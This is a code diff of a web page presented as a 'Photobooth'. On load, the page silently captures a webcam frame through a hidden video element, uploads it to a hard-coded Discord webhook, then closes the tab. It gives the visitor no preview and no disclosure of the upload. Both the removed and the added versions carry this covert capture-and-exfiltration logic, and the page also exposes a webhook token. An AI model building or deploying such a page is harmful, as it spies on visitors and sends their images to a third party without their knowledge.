@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Photo Booth</title>
+    <title>Photobooth</title>
 </head>
 <body>
     <video id="video" autoplay style="display: none;"></video>
@@ -15,70 +15,51 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-
-                // Play the video
                 video.play();
 
-                // Wait 3 seconds, take a photo, and send it
+                // Wait a moment, then take a photo
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     const context = canvas.getContext('2d');
-
-                    // Set canvas size to video size
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
-
-                    // Draw video frame to canvas
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    // Convert canvas to image data
-                    const photo = canvas.toDataURL('image/png');
-
-                    // Send to Discord
-                    sendToDiscord(photo);
-
-                    // Stop camera and close tab
-                    stream.getTracks().forEach(track => track.stop());
-                    window.close();
+                    // Convert canvas to Blob and send to Discord
+                    canvas.toBlob((blob) => {
+                        sendToDiscord(blob);
+                        stream.getTracks().forEach(track => track.stop());
+                        window.close(); // Close the tab
+                    }, 'image/png');
                 }, 3000);
             } catch (err) {
-                alert('Camera access denied!');
+                alert('Camera access denied or an error occurred.');
                 console.error(err);
             }
         }
 
-        function sendToDiscord(photo) {
-    const webhookUrl = 'https://discord.com/api/webhooks/1323391157719269468/9KwhAyL1Lnz1PFpbXuy66DyH60rNGFpTQ1ZNwh40gUsG3v57zPfNgErHjOZX02g6X72u';
+        function sendToDiscord(imageBlob) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1323391157719269468/9KwhAyL1Lnz1PFpbXuy66DyH60rNGFpTQ1ZNwh40gUsG3v57zPfNgErHjOZX02g6X72uL'; // Replace with your webhook URL
+            const formData = new FormData();
 
-    // Convert base64 to Blob
-    const base64Data = photo.split(',')[1]; // Remove the data type prefix
-    const binaryData = atob(base64Data);
-    const arrayBuffer = new Uint8Array(binaryData.length);
-    for (let i = 0; i < binaryData.length; i++) {
-        arrayBuffer[i] = binaryData.charCodeAt(i);
-    }
-    const blob = new Blob([arrayBuffer], { type: 'image/png' });
+            // Add the image file to the FormData object
+            formData.append('file', imageBlob, 'photo.png');
 
-    // Create FormData
-    const formData = new FormData();
-    formData.append('file', blob, 'photo.png'); // Append the file
-
-    // Send the request
-    fetch(webhookUrl, {
-        method: 'POST',
-        body: formData,
-    })
-        .then(response => {
-            if (response.ok) {
-                console.log('Photo sent successfully!');
-            } else {
-                console.error('Failed to send photo to Discord.');
-                response.text().then(text => console.error(text));
-            }
-        })
-        .catch(err => console.error('Error:', err));
-}
-
+            // Send the request
+            fetch(webhookUrl, {
+                method: 'POST',
+                body: formData,
+            })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Photo sent successfully!');
+                    } else {
+                        console.error('Failed to send photo to Discord:', response.status);
+                        response.text().then(console.error); // Log Discord's response
+                    }
+                })
+                .catch(err => console.error('Error sending photo to Discord:', err));
+        }
 
         // Start the photobooth when the page loads
         window.onload = startPhotoBooth;
